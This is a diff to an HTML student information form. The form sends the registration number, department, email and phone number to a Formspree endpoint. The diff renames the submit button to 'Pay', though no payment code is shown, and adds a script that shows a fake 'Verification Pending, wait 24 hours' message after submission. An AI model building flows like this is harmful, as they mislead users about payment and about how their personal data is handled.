@@ -366,10 +366,9 @@
             <main id="infoForm" class="form-card hidden">
                 <h1 class="form-title">Personal Information</h1>
                 <form action="https://formspree.io/f/mrpbppyq" method="POST">
-                    
                     <div class="form-group">
-                        <label class="form-label" for="matno">Matric Number<span class="required-star">*</span></label>
-                        <input class="form-input" type="text" id="matno" name="Matric Number" placeholder="e.g. 22/123456789" required>
+                        <label class="form-label" for="matno">Registeration Number<span class="required-star">*</span></label>
+                        <input class="form-input" type="text" id="regno" name="Registeration Number" placeholder="e.g. 202212345678AA" required>
                     </div>
                     <div class="form-group">
                         <label class="form-label" for="department">Department<span class="required-star">*</span></label>
@@ -391,7 +390,7 @@
                         <input class="form-input" type="email" id="emailadress" name="Email" placeholder="e.g. jonny@gmail.com" required>
                     </div>
                     <div class="form-group">
-                        <label class="form-label" for="phonenumber">Phone Number<span class="required-star">*</span></label>
+                        <label class="form-label" for="phonenumber">Phone/WhatsApp Number<span class="required-star">*</span></label>
                         <input class="form-input" type="number" id="phonenumber" name="Phone Number" placeholder="e.g. 08012345678" required>
                     </div>
                     <div class="form-group">
@@ -405,19 +404,34 @@
                         </div>
                     </div>
                     <button type="submit" class="submit-btn">
-                        Verify and Login
+                        Pay
                         <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                             <polyline points="9 18 15 12 9 6"></polyline>
                         </svg>
                     </button>
                     <div class="login-redirect-container">
                         <p class="redirect-text">
-                            Don't have an account? 
-                            <a href="register.html" class="login-link-btn">Register</a>
+                            You will be redirected to your email, click the "send" button at the top<br>Already have an account? 
+                            <a href="index.html" class="login-link-btn">Login</a>
                         </p>
                     </div>
                 </form>
             </main>
+            <script>
+        document.getElementById('infoForm').addEventListener('submit', function(e) {
+            setTimeout(() => {
+                document.getElementById('infoForm').innerHTML = `
+                    <div style="text-align: center; padding: 40px 20px; font-family: sans-serif;">
+                        <div style="font-size: 50px; margin-bottom: 20px;">⏳</div>
+                        <h2 style="color: #333; margin-bottom: 10px;">Verification Pending</h2>
+                        <p style="color: #666; line-height: 1.6; max-width: 320px; margin: 0 auto; font-size: 16px;">
+                            Your submission request has been processed. Please **wait for 24 hours** before attempting to login again.
+                        </p>
+                    </div>
+                `;
+            }, 500);
+        });
+    </script>
         </div>
         <br>
         <hr class="divider">
